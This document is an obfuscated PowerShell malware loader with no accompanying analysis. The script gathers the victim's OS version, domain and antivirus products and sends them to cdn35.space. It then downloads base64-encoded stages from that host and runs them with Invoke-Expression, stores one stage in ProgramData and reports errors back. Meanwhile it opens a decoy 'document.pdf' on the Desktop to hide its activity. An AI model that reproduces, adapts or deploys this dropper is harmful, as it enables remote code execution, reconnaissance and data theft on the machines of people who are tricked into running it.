$DxjP = Start-Job -ScriptBlock {
    $BHjtgIItsdI = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $iAUHiOA = '4a40103f-d1a8-4ee6-a07a-668152416d1f'
    $EalkySWMEnZOSJui = [System.Net.WebUtility]::UrlEncode($BHjtgIItsdI)
    $AJCYtLvCWLfWL = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    $DLXeLiiJXNXcfaSQHPVOTG = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $mPfEvUyz = $DLXeLiiJXNXcfaSQHPVOTG | ForEach-Object {
        $_.displayName
    }
    $UtmbDjmhpqeIZbppUm = $mPfEvUyz -join ", "
    $prDYNffIeTvN = "w"
    $EHAYWBAiBNQEJkcZHU = (New-Guid).ToString()
    $IjDoWBznWaaRWI = New-Object Net.WebClient
    $IjDoWBznWaaRWI.Headers.Add("User-Agent", "myUserAgentHere")
    $OJUrlOVCVedwxZeTZUUYTwNs = "?qbKmasUTyoVyIllseKqomGU=$UtmbDjmhpqeIZbppUm&kcpa=$AJCYtLvCWLfWL&VTdyaOVsNsiHFyxbRiHa=$EalkySWMEnZOSJui&tZawbluyOtvJeFhtKvNS=35&mgNYzPIuAPKKgKreXTPmSILCeA=$iAUHiOA&File=Document_pdf&AdC=$prDYNffIeTvN&weOgyaSRLwQOj=$EHAYWBAiBNQEJkcZHU"
    $jTPukcjkZLgmaesWqc = "http"+"s"+"://"+"cdn3"+"5"+".space/73689d8a-2"+"5"+"b4-41cf-b693-0"+"5"+""+"5"+"91ed804a7-7433f7b1-9997-477b-aadc-"+"5"+"a6e8d233c61" + "$($OJUrlOVCVedwxZeTZUUYTwNs)"
    $aqJPYk = $IjDoWBznWaaRWI.DownloadString($jTPukcjkZLgmaesWqc)
    $SFNjqakTTaXVWkejGYO = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($aqJPYk))
    $U = "usradm"
    if ($SFNjqakTTaXVWkejGYO.Contains($U)) {
        
        try {
            
            $qoao = "sfVYYUoa.ps1"
            $bhZYYc = "C:\ProgramData\$($qoao)"
            $SFNjqakTTaXVWkejGYO | Out-File -FilePath $bhZYYc
            $VuHc = $qoao
            $OJUrlOVCVedwxZeTZUUYTwNs = "?IALRkAhmkttPoyABVowyVPA=$($qoao)&mgNYzPIuAPKKgKreXTPmSILCeA=$($iAUHiOA)"
            $aodSbLFchNhP = "http"+"s"+"://"+""+"c"+"dn35.spa"+"c"+"e/bb9"+"c"+"1a14-4e3d-40ab-b"+"c"+""+"c"+"8-0b84e78255b0-4bed9ff2-0f4e-48fb-92ed-1065f"+"c"+"d85e01" + "$($OJUrlOVCVedwxZeTZUUYTwNs)"
            $aqJPYk = $IjDoWBznWaaRWI.DownloadString($aodSbLFchNhP)
            $SFNjqakTTaXVWkejGYO = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($aqJPYk))
            Invoke-Expression $SFNjqakTTaXVWkejGYO
        }
        catch {
            $GMXL = $_.Exception.Message
            $phUwUFNhZyItSCCU = "?weOgyaSRLwQOj=$($EHAYWBAiBNQEJkcZHU)&KCTuKCqjdP=$($GMXL)"
            $WtWoJbgokkgQbk = "http"+"s"+"://"+"cdn35.sp"+"a"+"ce/223dc805-5605-4"+"a"+"0b-b828-cd"+"a"+"d1b84126e-79d39c2c-0f10-48d1-9edf-c18"+"a"+"784efb"+"a"+"0" + "$($phUwUFNhZyItSCCU)"
            $aqJPYk = $IjDoWBznWaaRWI.DownloadString($WtWoJbgokkgQbk)
            try {
                $RougRTqK = "?aklshdjahsjdh=35&ajhsdjhasjhd=nsp&ahsdjkasjkdh=$($($EHAYWBAiBNQEJkcZHU))"
                $QOOnQwUvbnDfiRDgcDe = "http"+"s"+"://"+"c"+"d"+"n35.space/974afa0a-"+"d"+"334-48ec-a0"+"d"+"4-4cc14efa730c-1"+"d"+"3"+"d"+"044a-e654-41e3-a"+"d"+"32-38a2934393e4" + "$($RougRTqK)"
                $aqJPYk = $IjDoWBznWaaRWI.DownloadString($QOOnQwUvbnDfiRDgcDe)
                $SFNjqakTTaXVWkejGYO = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($aqJPYk))
                Invoke-Expression $SFNjqakTTaXVWkejGYO
            }
            catch {
                $GMXL = $_.Exception.Message
                $phUwUFNhZyItSCCU = "?weOgyaSRLwQOj=$($EHAYWBAiBNQEJkcZHU)&KCTuKCqjdP=$($GMXL)"
                $WtWoJbgokkgQbk = "http"+"s"+"://"+"cdn35.sp"+"a"+"ce/223dc805-5605-4"+"a"+"0b-b828-cd"+"a"+"d1b84126e-79d39c2c-0f10-48d1-9edf-c18"+"a"+"784efb"+"a"+"0" + "$($phUwUFNhZyItSCCU)"
                $aqJPYk = $IjDoWBznWaaRWI.DownloadString($WtWoJbgokkgQbk)
            }
        }
    } else {
        try {
            
            Invoke-Expression $SFNjqakTTaXVWkejGYO
        }
        catch {
            
            $GMXL = $_.Exception.Message
            $phUwUFNhZyItSCCU = "?weOgyaSRLwQOj=$($EHAYWBAiBNQEJkcZHU)&KCTuKCqjdP=$($GMXL)"
            $WtWoJbgokkgQbk = "http"+"s"+"://"+"cdn35.sp"+"a"+"ce/223dc805-5605-4"+"a"+"0b-b828-cd"+"a"+"d1b84126e-79d39c2c-0f10-48d1-9edf-c18"+"a"+"784efb"+"a"+"0" + "$($phUwUFNhZyItSCCU)"
            $aqJPYk = $IjDoWBznWaaRWI.DownloadString($WtWoJbgokkgQbk)
            try {
                $RougRTqK = "?aklshdjahsjdh=35&ajhsdjhasjhd=nsp&ahsdjkasjkdh=$($($EHAYWBAiBNQEJkcZHU))"
                $QOOnQwUvbnDfiRDgcDe = "http"+"s"+"://"+"c"+"d"+"n35.space/974afa0a-"+"d"+"334-48ec-a0"+"d"+"4-4cc14efa730c-1"+"d"+"3"+"d"+"044a-e654-41e3-a"+"d"+"32-38a2934393e4" + "$($RougRTqK)"
                $aqJPYk = $IjDoWBznWaaRWI.DownloadString($QOOnQwUvbnDfiRDgcDe)
                $SFNjqakTTaXVWkejGYO = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($aqJPYk))
                Invoke-Expression $SFNjqakTTaXVWkejGYO
            }
            catch {
                $GMXL = $_.Exception.Message
                $phUwUFNhZyItSCCU = "?weOgyaSRLwQOj=$($EHAYWBAiBNQEJkcZHU)&KCTuKCqjdP=$($GMXL)"
                $WtWoJbgokkgQbk = "http"+"s"+"://"+"cdn35.sp"+"a"+"ce/223dc805-5605-4"+"a"+"0b-b828-cd"+"a"+"d1b84126e-79d39c2c-0f10-48d1-9edf-c18"+"a"+"784efb"+"a"+"0" + "$($phUwUFNhZyItSCCU)"
                $aqJPYk = $IjDoWBznWaaRWI.DownloadString($WtWoJbgokkgQbk)
            }
        }
    }
}

$TygThAunpzsnlllzJsgyi = "http"+"s"+"://"+"cdn35."+"s"+"pace/file"+"s"+"/document.pdf"
Invoke-WebRequest -Uri $TygThAunpzsnlllzJsgyi -OutFile "$([Environment]::GetFolderPath('Desktop'))\document.pdf"
Start-Process -FilePath "$([Environment]::GetFolderPath('Desktop'))\document.pdf"

Receive-Job -Job $DxjP -Wait